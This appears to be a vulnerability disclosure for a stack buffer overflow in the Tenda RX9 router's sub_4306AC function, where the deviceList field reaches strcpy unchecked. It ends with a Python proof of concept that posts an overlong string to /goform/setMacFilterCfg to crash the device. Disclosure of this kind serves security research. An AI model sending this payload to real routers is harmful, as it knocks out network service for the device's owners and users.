# Tenda router sub_4306AC function stack overflow vulnerability

> vendor:Tenda
>
> product:RX9
>
> version:v1.0 v22.03.02.54
>
> type:Stack Overflow

## Vulnerability Description

Tenda RX9 v1.0 v22.03.02.54 were discovered to contain a stack overflow via the list parameter in the sub_4306AC function.

## Vulnerability Details

In the function, after V3 obtains the variable named "deviceList", it is called by the function sub_42F420 without processing, and then passed to the dangerous function strcpy without processing in the sub_42F420 function. The attacker can modify the variable in the post request. The parameter length of deviceList may cause a stack buffer overflow to achieve a denial of service attack.

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/9525b077-8b27-4c46-b47c-b881c08473a1)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/f08c8cfb-dcad-4276-a425-5c0758ac2164)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/0f35ba7a-4d79-4750-bf5b-117770a5f8d4)


## POC

    import requests

    ip = "192.168.244.130"
    cyclic = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r"
    def exploit_formSetMacFilterCfg():
    url = f"http://{ip}/goform/setMacFilterCfg"
    data = {
        b'macFilterType':b'white',
        b'deviceList':cyclic
        }
    res = requests.post(url=url,data=data)
    print(res.content)

    exploit_formSetMacFilterCfg()


   
